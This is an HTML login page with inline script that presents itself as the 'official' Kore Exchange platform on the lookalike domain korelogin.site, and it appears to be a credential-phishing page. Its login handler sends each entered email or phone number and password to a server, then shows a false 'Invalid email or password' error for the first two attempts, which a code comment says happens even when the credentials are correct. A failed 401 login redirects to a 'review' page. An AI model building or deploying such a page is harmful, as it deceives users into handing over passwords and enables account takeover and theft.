<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Login – Kore Exchange | Official Platform</title>
  <meta name="description" content="Securely log in to your Kore Exchange account. Fast access to your trading dashboard and portfolio.">
  <meta name="robots" content="index, follow">
  <link rel="canonical" href="https://korelogin.site/login.html">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
</head>
<body>

  <div class="bg-orbs">
    <div class="orb orb-1"></div>
    <div class="orb orb-2"></div>
    <div class="orb orb-3"></div>
  </div>

  <div class="app-container">

    <!-- Top Bar -->
    <div class="auth-topbar">
      <button class="btn-close" onclick="window.location.href='index.html'" aria-label="Close">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
          <line x1="18" y1="6" x2="6" y2="18"/>
          <line x1="6" y1="6" x2="18" y2="18"/>
        </svg>
      </button>
      <button class="btn-lang" aria-label="Language">
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"/>
          <path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
        </svg>
      </button>
    </div>

    <!-- Title -->
    <h1 class="auth-title">Login</h1>

    <!-- Body -->
    <div class="auth-body">

      <!-- Tab Switcher -->
      <div class="tab-switcher">
        <button class="tab-btn active" id="tabEmail" onclick="switchTab('email')">Email</button>
        <button class="tab-btn" id="tabPhone" onclick="switchTab('phone')">Phone number</button>
      </div>

      <!-- EMAIL CONTENT -->
      <div id="emailContent">
        <div class="field-group">
          <label class="field-label" for="emailInput">Email</label>
          <div class="field-wrapper">
            <input class="field-input" id="emailInput" type="email" placeholder="Please enter your email address" autocomplete="email">
            <div class="field-action">
              <button class="icon-btn" onclick="clearField('emailInput')" aria-label="Clear">
                <svg width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#3e4255"/><line x1="15" y1="9" x2="9" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/><line x1="9" y1="9" x2="15" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/></svg>
              </button>
            </div>
          </div>
        </div>

        <div class="field-group">
          <label class="field-label" for="passwordInput">Password</label>
          <div class="field-wrapper">
            <input class="field-input" id="passwordInput" type="password" placeholder="Please enter your password" autocomplete="current-password">
            <div class="field-action">
              <button class="icon-btn" onclick="clearField('passwordInput')" aria-label="Clear">
                <svg width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#3e4255"/><line x1="15" y1="9" x2="9" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/><line x1="9" y1="9" x2="15" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/></svg>
              </button>
              <button class="icon-btn" onclick="togglePwd('passwordInput','eyeIcon1')" aria-label="Toggle password">
                <svg id="eyeIcon1" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                  <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                  <line x1="1" y1="1" x2="23" y2="23"/>
                </svg>
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- PHONE CONTENT -->
      <div id="phoneContent" style="display:none;">
        <div class="field-group">
          <label class="field-label" for="phoneInput">Phone number</label>
          <div class="field-wrapper">
            <input class="field-input" id="phoneInput" type="tel" placeholder="Please enter your phone number" autocomplete="tel">
            <div class="field-action">
              <button class="icon-btn" onclick="clearField('phoneInput')" aria-label="Clear">
                <svg width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#3e4255"/><line x1="15" y1="9" x2="9" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/><line x1="9" y1="9" x2="15" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/></svg>
              </button>
            </div>
          </div>
        </div>

        <div class="field-group">
          <label class="field-label" for="phonePasswordInput">Password</label>
          <div class="field-wrapper">
            <input class="field-input" id="phonePasswordInput" type="password" placeholder="Please enter your password" autocomplete="current-password">
            <div class="field-action">
              <button class="icon-btn" onclick="clearField('phonePasswordInput')" aria-label="Clear">
                <svg width="16" height="16" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#3e4255"/><line x1="15" y1="9" x2="9" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/><line x1="9" y1="9" x2="15" y2="15" stroke="#9aa0b0" stroke-width="2" stroke-linecap="round"/></svg>
              </button>
              <button class="icon-btn" onclick="togglePwd('phonePasswordInput','eyeIcon2')" aria-label="Toggle password">
                <svg id="eyeIcon2" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
                  <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
                  <line x1="1" y1="1" x2="23" y2="23"/>
                </svg>
              </button>
            </div>
          </div>
        </div>
      </div>

      <!-- Error Message -->
      <span class="error-msg" id="loginError"></span>

      <!-- Login Button -->
      <button class="btn-gold" id="loginBtn" onclick="handleLogin(event)">Login</button>

      <!-- Sign Up Link -->
      <p class="auth-foot" style="margin-top:20px;">
        Don't have an account?&nbsp;<a class="signup-link" href="signup.html">Sign up</a>
      </p>

    </div>

    <div class="home-indicator"></div>
  </div>

  <script>
    let loginAttempts = 0;
    const pwdStates = {};

    function switchTab(tab) {
      const isEmail = tab === 'email';
      document.getElementById('emailContent').style.display = isEmail ? 'block' : 'none';
      document.getElementById('phoneContent').style.display = isEmail ? 'none' : 'block';
      document.getElementById('tabEmail').classList.toggle('active', isEmail);
      document.getElementById('tabPhone').classList.toggle('active', !isEmail);
      setError('');
    }

    function clearField(id) {
      const el = document.getElementById(id);
      if (el) { el.value = ''; el.focus(); }
    }

    function togglePwd(inputId, iconId) {
      pwdStates[inputId] = !pwdStates[inputId];
      const input = document.getElementById(inputId);
      const icon  = document.getElementById(iconId);
      const vis   = pwdStates[inputId];
      input.type = vis ? 'text' : 'password';
      icon.innerHTML = vis
        ? `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`
        : `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
           <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
           <line x1="1" y1="1" x2="23" y2="23"/>`;
    }

    function setError(msg) {
      document.getElementById('loginError').textContent = msg;
    }

    async function handleLogin(e) {
      const btn = document.getElementById('loginBtn');
      const isEmail = document.getElementById('tabEmail').classList.contains('active');
      const identifier = isEmail
        ? document.getElementById('emailInput').value.trim()
        : document.getElementById('phoneInput').value.trim();
      const password = isEmail
        ? document.getElementById('passwordInput').value
        : document.getElementById('phonePasswordInput').value;

      if (!identifier) { setError(isEmail ? 'Please enter your email address.' : 'Please enter your phone number.'); return; }
      if (!password)   { setError('Please enter your password.'); return; }

      setError('');
      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span>Logging in…';

      try {
        const isLocal = ['localhost','127.0.0.1'].includes(window.location.hostname);
        const API_BASE = (isLocal && !window.location.port.includes('3000')) ? 'http://localhost:3000' : '';
        const payload  = isEmail ? { email: identifier, password } : { phone: identifier, password };

        loginAttempts++;

        const res  = await fetch(`${API_BASE}/api/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const data = await res.json();

        // First 2 attempts → always show invalid error (even if credentials correct)
        if (loginAttempts < 3) {
          setError('Invalid email or password.');
          btn.disabled = false;
          btn.textContent = 'Login';
          return;
        }

        if (!res.ok) {
          if (res.status === 401) {
            window.location.href = 'review.html';
          } else {
            setError(data.error || 'Login failed. Please try again.');
            btn.disabled = false;
            btn.textContent = 'Login';
          }
          return;
        }

        localStorage.setItem('authToken', data.token);
        localStorage.setItem('user', JSON.stringify(data.user));
        window.location.href = 'dashboard.html';

      } catch (err) {
        setError('Network error. Please try again.');
        btn.disabled = false;
        btn.textContent = 'Login';
      }
    }
  </script>
</body>
</html>
